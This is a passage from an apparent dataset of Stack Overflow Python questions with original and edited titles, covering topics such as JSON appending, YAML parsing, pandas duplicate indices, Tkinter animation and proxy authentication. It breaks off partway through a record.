"Researched an error I'm getting and applied the suggestions, but am still getting TypeError: unsupported operand type(s) for -: 'int' and 'function'"," I am a beginner in Python and am working on an assignment. I keep getting TypeError: unsupported operand type(s) for -: 'int' and 'function' even after researching the error and applying the suggested fixes. I'm not looking for anyone to hand me a solution, but I would appreciate a second look. I'm missing something but I don't know what. This is the section of code I'm having trouble with: This is the entire error I get: I'd really appreciate any insight. Thank you. <code>  month = 0interestYDT = 0balance = int(raw_input (""Enter balance on credit card: ""))annualInterestRate = float(raw_input (""Enter annual interest rate as a decimal: ""))monthlyPaymentRate = float(raw_input (""Enter minimum monthly payment rate as a decimal: ""))previousbalance = balance#def monthlyInterestRate(annualInterestRate): return float(annualInterestRate/12)#if month <= 12: def minimumMonthlyPayment(previousbalance): return (previousbalance * monthlyPaymentRate) def monthlyInterest(monthlyInterestRate): return (1 + monthlyInterestRate) minMonPay = minimumMonthlyPayment monInt = monthlyInterest newbalance = ((previousbalance - minMonPay) * (monInt)) interestYDT = (interestYTD + montInt) previousbalance = (newbalance) print '' print ('Month:' (month)) print ('Minimum monthly payment: $ ' (round(minimumMonthlyPayment, 2))) print ('Remainging balance: $ ' (round(newbalance, 2))) print ' ' month = (month + 1) Traceback (most recent call last): File ""C:/Users/Karla/Documents/_MIT 600X Introduction to CS and Prog/Assignments/Week2/kmarciszewski_week2_Problemset_Problem1.py"", line 33, in <module> newbalance = ((previousbalance - minMonPay) * (monInt))TypeError: unsupported operand type(s) for -: 'int' and 'function'",Python TypeError: unsupported operand type(s) for -: 'int' and 'function'
(matplotlib) Plot yerr/xerr as shaded region rather than error bars," In matplotlib, how do I plot error as a shaded region rather than error bars?For example:rather than <code> ",Plot yerr/xerr as shaded region rather than error bars
Adding entries to a json file in Python," I'm trying to create a function that would add entries to a json file. Eventually, I want a file that looks like etc. This is what I have: This does create an entry such as {""name""=""some name"", ""url""=""some url""}. But, if I use this add function again, with different name and url, the first one gets overwritten. What do I need to do to get a second (third...) entry appended to the first one?EDIT: The first answers and comments to this question have pointed out the obvious fact that I am not using feeds in the write block. I don't see how to do that, though. For example, the following apparently will not do: <code>  [{""name"" = ""name1"", ""url"" = ""url1""}, {""name"" = ""name2"", ""url"" = ""url2""}] def add(args): with open(DATA_FILENAME, mode='r', encoding='utf-8') as feedsjson: feeds = json.load(feedsjson) with open(DATA_FILENAME, mode='w', encoding='utf-8') as feedsjson: entry = {} entry['name'] = args.name entry['url'] = args.url json.dump(entry, feedsjson) with open(DATA_FILENAME, mode='a+', encoding='utf-8') as feedsjson: feeds = json.load(feedsjson) entry = {} entry['name'] = args.name entry['url'] = args.url json.dump(entry, feeds)",How to append data to a json file?
Appending data to a json file in Python," I'm trying to create a function that would add entries to a json file. Eventually, I want a file that looks like etc. This is what I have: This does create an entry such as {""name""=""some name"", ""url""=""some url""}. But, if I use this add function again, with different name and url, the first one gets overwritten. What do I need to do to get a second (third...) entry appended to the first one?EDIT: The first answers and comments to this question have pointed out the obvious fact that I am not using feeds in the write block. I don't see how to do that, though. For example, the following apparently will not do: <code>  [{""name"" = ""name1"", ""url"" = ""url1""}, {""name"" = ""name2"", ""url"" = ""url2""}] def add(args): with open(DATA_FILENAME, mode='r', encoding='utf-8') as feedsjson: feeds = json.load(feedsjson) with open(DATA_FILENAME, mode='w', encoding='utf-8') as feedsjson: entry = {} entry['name'] = args.name entry['url'] = args.url json.dump(entry, feedsjson) with open(DATA_FILENAME, mode='a+', encoding='utf-8') as feedsjson: feeds = json.load(feedsjson) entry = {} entry['name'] = args.name entry['url'] = args.url json.dump(entry, feeds)",How to append data to a json file?
"Python, find all values in a matrix greater than a value"," I have to count all the values in a matrix (2-d array) that are less than 200.The code I wrote down for this is: o31 is an image and I am converting it into a matrix and then finding the values.Is there a simpler way to do this? <code>  za=0 p31 = numpy.asarray(o31) for i in range(o31.size[0]): for j in range(o32.size[1]): if p31[i,j]<200: za=za+1 print za",Count all values in a matrix less than a value
Count all values in a matrix greater than a value," I have to count all the values in a matrix (2-d array) that are less than 200.The code I wrote down for this is: o31 is an image and I am converting it into a matrix and then finding the values.Is there a simpler way to do this? <code>  za=0 p31 = numpy.asarray(o31) for i in range(o31.size[0]): for j in range(o32.size[1]): if p31[i,j]<200: za=za+1 print za",Count all values in a matrix less than a value
converting python yaml file to dict," I am having the following problem of mapping documents within a YAML file to a dict and properly mapping them.I have the following YAML file, which represents a server (db.yml): I load this YAML file, which I can do without any problems, I think I understand that. I'd like the logic to work like the following:load yaml, map to dictlook in every dict in the document, if the instanceId matches that which was set by getInstanceId(), then print out all of the keys and values for that document.If I look at the map data structure from the command line, I get: I think I might be creating the data structure for the YAML file improperly, and on matching the contents on the dict, I am a bit lost.Side note: I cannot load all of the documents in this file using yaml.load(), I tried yaml.load_all(), which seems to work but my main issue still exists. <code>  instanceId: i-aaaaaaaa environment:us-east serverId:someServer awsHostname:ip-someip serverName:somewebsite.com ipAddr:192.168.0.1 roles:[webserver,php] instanceId = getInstanceId()stream = file('db.yml', 'r')dict = yaml.load_all(stream)for key in dict: if key in dict == ""instanceId"": print key, dict[key] {'instanceId': 'i-aaaaaaaa environment:us-east serverId:someServer awsHostname:ip-someip serverName:someserver ipAddr:192.168.0.1 roles:[webserver,php]'}",Converting YAML file to python dict
Converting Python yaml file to dict," I am having the following problem of mapping documents within a YAML file to a dict and properly mapping them.I have the following YAML file, which represents a server (db.yml): I load this YAML file, which I can do without any problems, I think I understand that. I'd like the logic to work like the following:load yaml, map to dictlook in every dict in the document, if the instanceId matches that which was set by getInstanceId(), then print out all of the keys and values for that document.If I look at the map data structure from the command line, I get: I think I might be creating the data structure for the YAML file improperly, and on matching the contents on the dict, I am a bit lost.Side note: I cannot load all of the documents in this file using yaml.load(), I tried yaml.load_all(), which seems to work but my main issue still exists. <code>  instanceId: i-aaaaaaaa environment:us-east serverId:someServer awsHostname:ip-someip serverName:somewebsite.com ipAddr:192.168.0.1 roles:[webserver,php] instanceId = getInstanceId()stream = file('db.yml', 'r')dict = yaml.load_all(stream)for key in dict: if key in dict == ""instanceId"": print key, dict[key] {'instanceId': 'i-aaaaaaaa environment:us-east serverId:someServer awsHostname:ip-someip serverName:someserver ipAddr:192.168.0.1 roles:[webserver,php]'}",Converting YAML file to python dict
Why can't I get `pip install lxml` to work on a virtualenv?," Note: I'm using virtualenvwrapper.Before activating the virtual environment: After activating the virtual environment: <code>  $ pip install lxmlRequirement already satisfied (use --upgrade to upgrade): lxml in /usr/lib/python2.7/dist-packages Cleaning up... (test-env)$ pip install lxmlforce/build/lxml/src/lxml/includes/etree_defs.h:9:31: fatal error: libxml/xmlversion.h: No such file or directorycompilation terminated.error: command 'gcc' failed with exit status 1----------------------------------------Command /home/chaz/dev/envs/test-with-system-python-force/bin/python2.7 -c ""import setuptools;__file__='/home/chaz/dev/envs/test-with-system-python-force/build/lxml/setup.py';exec(compile(open(__file__).read().replace('\r\n', '\n'), __file__, 'exec'))"" install --record /tmp/pip-bJ6Q_B-record/install-record.txt --single-version-externally-managed --install-headers /home/chaz/dev/envs/test-env/include/site/python2.7 failed with error code 1 in /home/chaz/dev/envs/test-env/build/lxmlStoring complete log in /home/chaz/.pip/pip.log",Why can't I get `pip install lxml` to work within a virtualenv?
Remove rows with duplicate indices (DateFrame and TimeSeries)," How to remove rows with duplicate index values?In the weather DataFrame below, sometimes a scientist goes back and corrects observations -- not by editing the erroneous rows, but by appending a duplicate row to the end of a file.I'm reading some automated weather data from the web (observations occur every 5 minutes, and compiled into monthly files for each weather station.) After parsing a file, the DataFrame looks like: Example of a duplicate case: And so I need df3 to eventually become: I thought that adding a column of row numbers (df3['rownum'] = range(df3.shape[0])) would help me select the bottom-most row for any value of the DatetimeIndex, but I am stuck on figuring out the group_by or pivot (or ???) statements to make that work. <code>  Sta Precip1hr Precip5min Temp DewPnt WindSpd WindDir AtmPressDate 2001-01-01 00:00:00 KPDX 0 0 4 3 0 0 30.312001-01-01 00:05:00 KPDX 0 0 4 3 0 0 30.302001-01-01 00:10:00 KPDX 0 0 4 3 4 80 30.302001-01-01 00:15:00 KPDX 0 0 3 2 5 90 30.302001-01-01 00:20:00 KPDX 0 0 3 2 10 110 30.28 import pandas import datetimestartdate = datetime.datetime(2001, 1, 1, 0, 0)enddate = datetime.datetime(2001, 1, 1, 5, 0)index = pandas.DatetimeIndex(start=startdate, end=enddate, freq='H')data1 = {'A' : range(6), 'B' : range(6)}data2 = {'A' : [20, -30, 40], 'B' : [-50, 60, -70]}df1 = pandas.DataFrame(data=data1, index=index)df2 = pandas.DataFrame(data=data2, index=index[:3])df3 = df2.append(df1)df3 A B2001-01-01 00:00:00 20 -502001-01-01 01:00:00 -30 602001-01-01 02:00:00 40 -702001-01-01 03:00:00 3 32001-01-01 04:00:00 4 42001-01-01 05:00:00 5 52001-01-01 00:00:00 0 02001-01-01 01:00:00 1 12001-01-01 02:00:00 2 2 A B2001-01-01 00:00:00 0 02001-01-01 01:00:00 1 12001-01-01 02:00:00 2 22001-01-01 03:00:00 3 32001-01-01 04:00:00 4 42001-01-01 05:00:00 5 5",Remove pandas rows with duplicate indices
Remove rows with duplicate indices (Pandas DataFrame and TimeSeries)," How to remove rows with duplicate index values?In the weather DataFrame below, sometimes a scientist goes back and corrects observations -- not by editing the erroneous rows, but by appending a duplicate row to the end of a file.I'm reading some automated weather data from the web (observations occur every 5 minutes, and compiled into monthly files for each weather station.) After parsing a file, the DataFrame looks like: Example of a duplicate case: And so I need df3 to eventually become: I thought that adding a column of row numbers (df3['rownum'] = range(df3.shape[0])) would help me select the bottom-most row for any value of the DatetimeIndex, but I am stuck on figuring out the group_by or pivot (or ???) statements to make that work. <code>  Sta Precip1hr Precip5min Temp DewPnt WindSpd WindDir AtmPressDate 2001-01-01 00:00:00 KPDX 0 0 4 3 0 0 30.312001-01-01 00:05:00 KPDX 0 0 4 3 0 0 30.302001-01-01 00:10:00 KPDX 0 0 4 3 4 80 30.302001-01-01 00:15:00 KPDX 0 0 3 2 5 90 30.302001-01-01 00:20:00 KPDX 0 0 3 2 10 110 30.28 import pandas import datetimestartdate = datetime.datetime(2001, 1, 1, 0, 0)enddate = datetime.datetime(2001, 1, 1, 5, 0)index = pandas.DatetimeIndex(start=startdate, end=enddate, freq='H')data1 = {'A' : range(6), 'B' : range(6)}data2 = {'A' : [20, -30, 40], 'B' : [-50, 60, -70]}df1 = pandas.DataFrame(data=data1, index=index)df2 = pandas.DataFrame(data=data2, index=index[:3])df3 = df2.append(df1)df3 A B2001-01-01 00:00:00 20 -502001-01-01 01:00:00 -30 602001-01-01 02:00:00 40 -702001-01-01 03:00:00 3 32001-01-01 04:00:00 4 42001-01-01 05:00:00 5 52001-01-01 00:00:00 0 02001-01-01 01:00:00 1 12001-01-01 02:00:00 2 2 A B2001-01-01 00:00:00 0 02001-01-01 01:00:00 1 12001-01-01 02:00:00 2 22001-01-01 03:00:00 3 32001-01-01 04:00:00 4 42001-01-01 05:00:00 5 5",Remove pandas rows with duplicate indices
writing. txt and line break[Python 3.2]," I want to write a text file where many lines are created, so I want to know how to put each value on a new line.this is my code: in this part I need to put the line break: f.write(str(i))I have tried with: f.write(str(i)\n) but gives me an error <code>  import itertoolsfrom itertools import permutations , combinationslista=[]splits=itertools.permutations('0123456789', 5)for x in splits: lista.append(x)f=open('lala.txt', 'w')for i in lista: f.write(str(i))",writing text file with line breaks
Python - How do you recognize module that loaded by custom loader?," Before Python-3.3, I detected that a module was loaded by a custom loader with hasattr(mod, '__loader__').After Python-3.3, all modules have the __loader__ attribute regardless of being loaded by a custom loader.Python-2.7, 3.2: Python-3.3: How do I detect that a module was loaded by a custom loader? <code>  >>> import xml>>> hasattr(xml, '__loader__')False >>> import xml>>> hasattr(xml, '__loader__')True>>> xml.__loader__<_frozen_importlib.SourceFileLoader object at ...>",Python - How do you detect that a module has been loaded by custom loader?
benchmarks: has python a faster way of walking a folder," I need to walk through a folder with approximately ten thousand files. My old vbscript is very slow in handling this. Since I've started using Ruby and Python since then, I made a benchmark between the three scripting languages to see which would be the best fit for this job.The results of the tests below on a subset of 4500 files on a shared network are That Vbscript would be slowest was no surprise but I can't explain the difference between Ruby and Python. Is my test for Python not optimal? Is there a faster way to do this in Python?The test for thumbs.db is just for the test, in reality there are more tests to do.I needed something that checks every file on the path and doesn't produce too much output to not disturb the timing. The results are a bit different each run but not by much. EDIT: since i suspected the print caused a delay i tested the scripts with printing all 4500 files and also printing none, the difference remains, R:5 P:107 in the first case and R:4.5 P:107 in the latterEDIT2: based on the answers and comments here a Python version that in some cases could run faster by skipping folders <code>  Python: 106 secondsRuby: 5 secondsVbscript: 124 seconds #python2.7.0import osdef recurse(path): for (path, dirs, files) in os.walk(path): for file in files: if file.lower() == ""thumbs.db"": print (path+'/'+file)if __name__ == '__main__': import timeit path = '//server/share/folder/' print(timeit.timeit('recurse(""'+path+'"")', setup=""from __main__ import recurse"", number=1)) 'vbscript5.7set oFso = CreateObject(""Scripting.FileSystemObject"")const path = ""\\server\share\folder""start = TimermyLCfilename=""thumbs.db""sub recurse(folder) for each file in folder.Files if lCase(file.name) = myLCfilename then wscript.echo file end if next for each subfolder in folder.SubFolders call Recurse(subfolder) nextend Subset folder = oFso.getFolder(path)recurse(folder)wscript.echo Timer-start #ruby1.9.3require 'benchmark'def recursive(path, bench) bench.report(path) do Dir[""#{path}/**/**""].each{|file| puts file if File.basename(file).downcase == ""thumbs.db""} endendpath = '//server/share/folder/'Benchmark.bm {|bench| recursive(path, bench)} import osdef recurse(path): for (path, dirs, files) in os.walk(path): for file in files: if file.lower() == ""thumbs.db"": print (path+'/'+file)def recurse2(path): for (path, dirs, files) in os.walk(path): for dir in dirs: if dir in ('comics'): dirs.remove(dir) for file in files: if file.lower() == ""thumbs.db"": print (path+'/'+file)if __name__ == '__main__': import timeit path = 'f:/' print(timeit.timeit('recurse(""'+path+'"")', setup=""from __main__ import recurse"", number=1)) #6.20102692 print(timeit.timeit('recurse2(""'+path+'"")', setup=""from __main__ import recurse2"", number=1)) #2.73848228#ruby 5.7",benchmarks: does python have a faster way of walking a network folder?
benchmarks: does python have a faster way of walking a folder?," I need to walk through a folder with approximately ten thousand files. My old vbscript is very slow in handling this. Since I've started using Ruby and Python since then, I made a benchmark between the three scripting languages to see which would be the best fit for this job.The results of the tests below on a subset of 4500 files on a shared network are That Vbscript would be slowest was no surprise but I can't explain the difference between Ruby and Python. Is my test for Python not optimal? Is there a faster way to do this in Python?The test for thumbs.db is just for the test, in reality there are more tests to do.I needed something that checks every file on the path and doesn't produce too much output to not disturb the timing. The results are a bit different each run but not by much. EDIT: since i suspected the print caused a delay i tested the scripts with printing all 4500 files and also printing none, the difference remains, R:5 P:107 in the first case and R:4.5 P:107 in the latterEDIT2: based on the answers and comments here a Python version that in some cases could run faster by skipping folders <code>  Python: 106 secondsRuby: 5 secondsVbscript: 124 seconds #python2.7.0import osdef recurse(path): for (path, dirs, files) in os.walk(path): for file in files: if file.lower() == ""thumbs.db"": print (path+'/'+file)if __name__ == '__main__': import timeit path = '//server/share/folder/' print(timeit.timeit('recurse(""'+path+'"")', setup=""from __main__ import recurse"", number=1)) 'vbscript5.7set oFso = CreateObject(""Scripting.FileSystemObject"")const path = ""\\server\share\folder""start = TimermyLCfilename=""thumbs.db""sub recurse(folder) for each file in folder.Files if lCase(file.name) = myLCfilename then wscript.echo file end if next for each subfolder in folder.SubFolders call Recurse(subfolder) nextend Subset folder = oFso.getFolder(path)recurse(folder)wscript.echo Timer-start #ruby1.9.3require 'benchmark'def recursive(path, bench) bench.report(path) do Dir[""#{path}/**/**""].each{|file| puts file if File.basename(file).downcase == ""thumbs.db""} endendpath = '//server/share/folder/'Benchmark.bm {|bench| recursive(path, bench)} import osdef recurse(path): for (path, dirs, files) in os.walk(path): for file in files: if file.lower() == ""thumbs.db"": print (path+'/'+file)def recurse2(path): for (path, dirs, files) in os.walk(path): for dir in dirs: if dir in ('comics'): dirs.remove(dir) for file in files: if file.lower() == ""thumbs.db"": print (path+'/'+file)if __name__ == '__main__': import timeit path = 'f:/' print(timeit.timeit('recurse(""'+path+'"")', setup=""from __main__ import recurse"", number=1)) #6.20102692 print(timeit.timeit('recurse2(""'+path+'"")', setup=""from __main__ import recurse2"", number=1)) #2.73848228#ruby 5.7",benchmarks: does python have a faster way of walking a network folder?
Python DNS over proxy?," I've been pulling my hair out over the past few days looking around for a good solution to prevent DNS leaks over a socks4/5 proxy. I've looked into the SocksiPy(-branch) module, and tried to wrap a number of things (urllib,urllib2,dnstools), but they all seem to still leak DNS requests. So does pyCurl.I know that proxychains/proxyresolv can throw DNS requests over a socks4/5 proxy, and it does all it's magic with some LD_PRELOAD libraries to monkey-patch socket's functions, much like SocksiPy does, but I can't seem to figure out why it doesn't send DNS over either a socks4 or socks5 proxy.I suppose for linux I may be able to use CTypes with libproxychains.so to do my resolution, but I'm looking for something multi-platform, so I think monkey-patching the socket module is the way to go. Has anyone figured out a good way to get around this? I want to do it all in-code for portability's sake, and I don't want to resort to running another proxy server!Thanks! <code> ",DNS over proxy?
"animation with python, I am having trouble animating the canvas ship to back and forth along the x-axis?"," Why is the animation not working? The shape doesn't move when I run the program. <code>  from Tkinter import *import timeclass alien(object): def __init__(self): self.root = Tk() self.canvas = Canvas(self.root, width=400, height = 400) self.canvas.pack() alien1 = self.canvas.create_oval(20, 260, 120, 360, outline='white', fill='blue') alien2 = self.canvas.create_oval(2, 2, 40, 40, outline='white', fill='red') self.canvas.pack() self.root.mainloop() def animation(self): track = 0 while True: x = 5 y = 0 if track == 0: for i in range(0,51): self.time.sleep(0.025) self.canvas.move(alien1, x, y) self.canvas.move(alien2, x, y) self.canvas.update() track = 1 print ""check"" else: for i in range(0,51): self.time.sleep(0.025) self.canvas.move(alien1, -x, y) self.canvas.move(alien2, -x, y) self.canvas.update() track = 0 print trackalien()",Python Tkinter Animation
Python Tkinter Animation," Why is the animation not working? The shape doesn't move when I run the program. <code>  from Tkinter import *import timeclass alien(object): def __init__(self): self.root = Tk() self.canvas = Canvas(self.root, width=400, height = 400) self.canvas.pack() alien1 = self.canvas.create_oval(20, 260, 120, 360, outline='white', fill='blue') alien2 = self.canvas.create_oval(2, 2, 40, 40, outline='white', fill='red') self.canvas.pack() self.root.mainloop() def animation(self): track = 0 while True: x = 5 y = 0 if track == 0: for i in range(0,51): self.time.sleep(0.025) self.canvas.move(alien1, x, y) self.canvas.move(alien2, x, y) self.canvas.update() track = 1 print ""check"" else: for i in range(0,51): self.time.sleep(0.025) self.canvas.move(alien1, -x, y) self.canvas.move(alien2, -x, y) self.canvas.update() track = 0 print trackalien()",Python Tkinter Animation
"animation with python, I am having trouble animating the canvas ship to back and forth along the x-axis?"," Why is the animation not working? The shape doesn't move when I run the program. <code>  from Tkinter import *import timeclass alien(object): def __init__(self): self.root = Tk() self.canvas = Canvas(self.root, width=400, height = 400) self.canvas.pack() alien1 = self.canvas.create_oval(20, 260, 120, 360, outline='white', fill='blue') alien2 = self.canvas.create_oval(2, 2, 40, 40, outline='white', fill='red') self.canvas.pack() self.root.mainloop() def animation(self): track = 0 while True: x = 5 y = 0 if track == 0: for i in range(0,51): self.time.sleep(0.025) self.canvas.move(alien1, x, y) self.canvas.move(alien2, x, y) self.canvas.update() track = 1 print ""check"" else: for i in range(0,51): self.time.sleep(0.025) self.canvas.move(alien1, -x, y) self.canvas.move(alien2, -x, y) self.canvas.update() track = 0 print trackalien()",Python Tkinter Animation
calculating angle between two lines in python," I am trying to calculate the angle between two lines in python.I searched the internet and found the equation on how to do it. But I don't always get accurate result. Some of the results are clearly false when other seems correct.My code is given below: the result it produces is : The problem is that I don't understand why the second result, fifth and the last one are zeroed they intersect since they share a point and the other point in not duplicated since the value in the array is different. <code>  def angle(pt1,pt2): m1 = (pt1.getY() - pt1.getY())/1 m2 = (pt2.getY() - pt1.getY())/(pt2.getX()-pt1.getX()) tnAngle = (m1-m2)/(1+(m1*m2)) return math.atan(tnAngle)def calculate(pt,ls): i=2 for x in ls: pt2 = point(x,i) i=i+1 ang = angle(pt,pt2)*180/math.pi ang = ang * (-1) print angpt = point(3,1)ls = [1,7,0,4,9,6,150]calculate(pt,ls) 45.00.045.0-75.96375653210.0-63.43494882290.0",Calculating angle between two vectors in python
How to compose string from regex pattern with named groups and datadict in python," Short version:I want to crate function which replace all named groups in regular expression with coresponding data from datadict.For example: But i have no idea how to do it.Some addtional info:I have code which iterate trough list of tuples containing name and pattern and trying to use re.search. In case that re.search match given string it returns name from current tuple and groupdict() (which is dict with data from re.search).Here is the code Now i would like to create function: Above function should replace all named groups with coresponding data from datadict.SOLUTIONUsing answer provided by Hans Then (Thanks!) and some other info here is the solution: function ""partial"" can be imported from functools <code>  Input: expr=r""/(?P<something>\w+)/whatever/(?P<something2>\w+)"" data={""something"":123, ""something2"": ""thing""}Output: ""/123/whatever/thing"" class UrlResolver():def __init__(self): self.urls = {}def parse(self, app, url): for pattern in self.urls[app]: data = re.search(pattern[1], url) if data: return {""name"": pattern[0], ""data"": data.groupdict()} def compose(self, app, name, data): for pattern in self.url[app]: if pattern[0] == name: return string composed from regex expression and data from data dict. def _group_replacer(data, match): data_key = match.group(1) return data[data_key] expression = r""\([^\(]*<([^<]*)>[^\(]*\)"" expression = re.compile(expression) reversed = re.sub(expression, partial(_group_replacer, data), string)",How to compose string from regex pattern with named groups and datadict in python?
How can I get Python to use upper case letters to print hex values?," In Python v2.6 I can get hexadecimal for my integers in one of two ways: However, in both cases, the hexadecimal digits are lower case. How can I get these in upper case? <code>  print((""0x%x"")%value)print(hex(value))",How can I get Python to use upper case letters when printing hexadecimal values?
How can I get Python to use upper case letters to print hexadecimal values?," In Python v2.6 I can get hexadecimal for my integers in one of two ways: However, in both cases, the hexadecimal digits are lower case. How can I get these in upper case? <code>  print((""0x%x"")%value)print(hex(value))",How can I get Python to use upper case letters when printing hexadecimal values?
pyYAML Excepts on a ! character in a string: Why and how to fix?," First, a disclaimer: I'm not too familiar with YAML. I'm trying to parse a YAML doc into Key Value Pairs (don't worry about how I'm doing it. I've got that bit handled)My file used to look something like: Then, someone went and changed it. And I get this parse error: What does this even mean? How would I go about getting it to just interpret !$ as just two characters?I just want a dictionary of string keys and values!Also, editing the yaml files is not an option. Problem must be fixed in the code using the parser. <code>  world: people: name:Suzy address:chez-bob world: people: name:!$uzy address:chez-bob yaml.constructor.ConstructorError: could not determine a constructor for the tag '!$uzy'","pyYAML Errors on ""!"" in a string"
Python : urllib2.HTTPError: HTTP Error 403: Forbidden," I am trying to automate download of historic stock data using python. The URL I am trying to open responds with a CSV file, but I am unable to open using urllib2. I have tried changing user agent as specified in few questions earlier, I even tried to accept response cookies, with no luck. Can you please help. Note: The same method works for yahoo Finance.Code: Error File ""C:\Python27\lib\urllib2.py"", line 527, in http_error_default raise HTTPError(req.get_full_url(), code, msg, hdrs, fp) urllib2.HTTPError: HTTP Error 403: ForbiddenThanks for your assistance <code>  import urllib2,cookielibsite= ""http://www.nseindia.com/live_market/dynaContent/live_watch/get_quote/getHistoricalData.jsp?symbol=JPASSOCIAT&fromDate=1-JAN-2012&toDate=1-AUG-2012&datePeriod=unselected&hiddDwnld=true""hdr = {'User-Agent':'Mozilla/5.0'}req = urllib2.Request(site,headers=hdr)page = urllib2.urlopen(req)",urllib2.HTTPError: HTTP Error 403: Forbidden
2d dictionary with multiple keys per value," I think I want to make a 2D dictionary with multiple keys per value.I know how to make a 2D dictionary using defaultdict: And I know that using regular dictionaries you can make with multiple keys like: But I want to do something like lookup by tuple-of-keys: In the first dimension of dictionary I need ~25 keys per value. Is there a way to do this with defaultdict?Even if there is a way to do it with dicts is this a reasonable way to make a simple multidimensional lookup table?  <code>  from collections import defaultdict2d_dict = defaultdict(dict)2d_dict['canned_food']['spam'] = 'delicious' dictionary={('food','canned_food'):spam} 2d_dict[('canned_food','food')]['spam'] = 'delicious'",Create and lookup 2D dictionary with multiple keys per value
Qt: Custom QDockWidget display," How would you get a display of dockwidgets/centralwidget in which the dockwidget in the Qt::BottomDockWidgetArea or Qt::TopDockWidgetArea doesn't take Qt::LeftDockWidgetArea nor Qt::RighDockWidgetArea space? This is the actual display, with 2 dockwidgets and the central widget at the top right:This would be the preferred display: <code> ",Custom QDockWidget display
unless statement in python," Is there an equivalent to the unless statement in Python? I do not want to append a line to a label if it has p4port in it: I get a Syntax error: <code>  for line in newLines: if 'SU' in line or 'AU' in line or 'VU' in line or 'rf' in line and line.find('/*') == -1: lineMatch = False for l in oldLines: if '@' in line and line == l and 'p4port' not in line: lineMatch = True line = line.strip('\n') line = line.split('@')[1] line = line + '<br>\n' labels.append(line) if '@' in line and not lineMatch: line = line.strip('\n') line = line.split('@')[1] line=""<font color='black' style='background:rgb(255, 215, 0)'>""+line+""</font><br>\n"" labels.append(line) if '@' in line and not lineMatch: UnboundLocalError: local variable 'lineMatch' referenced before assignment",unless statement in Python
swap values in a tuple/list inside a list in python?," I have a list of tuples like this: What is the fastest way in python (running on a very low cpu/ram machine) to swap values like this... I am currently using: Is there a better or faster way??? <code>  [('foo','bar'),('foo1','bar1'),('foofoo','barbar')] [('bar','foo'),('bar1','foo1'),('barbar','foofoo')] for x in mylist: self.my_new_list.append(((x[1]),(x[0])))",Swap values in a tuple/list inside a list in python?
why 2.__add__(3) doesn't work in Python?," The integer 2 has an __add__ method: ... but calling it raises a SyntaxError: Why can't I use the __add__ method? <code>  >>> ""__add__"" in dir(2)True >>> 2.__add__(3) File ""<stdin>"", line 1 2.__add__(3) ^SyntaxError: invalid syntax",Why doesn't 2.__add__(3) work in Python?
Python: Length of longest sublist?," Possible Duplicate:Pythons most efficient way to choose longest string in list?I have a list L I want to return the length of the longest sublist without needing to loop through them, in this case 3 because [1,2,3] is length 3 and it is the longest of the four sublists. I tried len(max(L)) but this doesn't do what I want. Any way to do this or is a loop my only way? <code>  L = [[1,2,3],[5,7],[1,3],[77]]",Length of the longest sublist?
Watch for a variable change in python," There is large python project where one attribute of one class just have wrong value in some place.It should be sqlalchemy.orm.attributes.InstrumentedAttribute, but when I run tests it is constant value, let's say string.There is some way to run python program in debug mode, and run some check (if variable changed type) after each step throught line of code automatically?P.S. I know how to log changes of attribute of class instance with help of inspect and property decorator. Possibly here I can use this method with metaclasses...But sometimes I need more general and powerfull solution...Thank you.P.P.S. I need something like there: https://stackoverflow.com/a/7669165/816449, but may be with more explanation of what is going on in that code. <code> ",How to watch for a variable change in python without dunder setattr or pdb
Missed errorbars when using yscale('log') at matplotlib," In some cases matplotlib shows plot with errorbars errorneously when using logarithmic scale. Suppose these data (within pylab for example): and I get a normal result but when I switch to logarithmic scale: I get a plot in which some errorbars are not visible, although you can still see some of the error bar caps. (See below.) Why is this happening, and how can I fix it? <code>  s=[19.0, 20.0, 21.0, 22.0, 24.0]v=[36.5, 66.814250000000001, 130.17750000000001, 498.57466666666664, 19.41]verr=[0.28999999999999998, 80.075044597909169, 71.322124839818571, 650.11015891565125, 0.02]errorbar(s,v,yerr=verr) yscale('log')",Missing errorbars when using yscale('log') at matplotlib
How to pass proxy-authentication (requires digest auth) by using python requests module.," I was using Mechanize module a while ago, and now try to use Requests module. (Python mechanize doesn't work when HTTPS and Proxy Authentication required)I have to go through proxy-server when I access the Internet. The proxy-server requires authentication. I wrote the following codes. The above codes work well when proxy-server requires basic authentication. Now I want to know what I have to do when proxy-server requires digest authentication. HTTPProxyAuth seems not to be effective in digest authentication (r.status_code returns 407).  <code>  import requestsfrom requests.auth import HTTPProxyAuthproxies = {""http"":""192.168.20.130:8080""}auth = HTTPProxyAuth(""username"", ""password"")r = requests.get(""http://www.google.co.jp/"", proxies=proxies, auth=auth)",How to pass proxy-authentication (requires digest auth) by using python requests module
Parsing data to create a json data object with python," Here is my data from google bigquery to parse: Being a Python newbee, I really have no idea about how to go about parsing this data to create a json object like below: Can any one give me any hint about how to get started?Example In this for the word 'the', count is 995 and year is 1600. And so it follows. <code>  { u'kind': u'bigquery#queryResponse', u'rows': [ { u'f': [ { u'v': u'the' }, { u'v': u'995' }, { u'v': u'1600' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'942' }, { u'v': u'1607' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'937' }, { u'v': u'1599' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'894' }, { u'v': u'1598' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'848' }, { u'v': u'1592' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'841' }, { u'v': u'1590' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'786' }, { u'v': u'1603' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'779' }, { u'v': u'1609' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'762' }, { u'v': u'1597' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'753' }, { u'v': u'1594' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'740' }, { u'v': u'1596' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'738' }, { u'v': u'1612' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'718' }, { u'v': u'1590' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'717' }, { u'v': u'1610' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'715' }, { u'v': u'1602' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'680' }, { u'v': u'1606' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'674' }, { u'v': u'1603' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'639' }, { u'v': u'1603' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'637' }, { u'v': u'1603' } ] }, { u'f': [ { u'v': u'the' }, { u'v': u'634' }, { u'v': u'1590' } ] }, { u'f': [ { 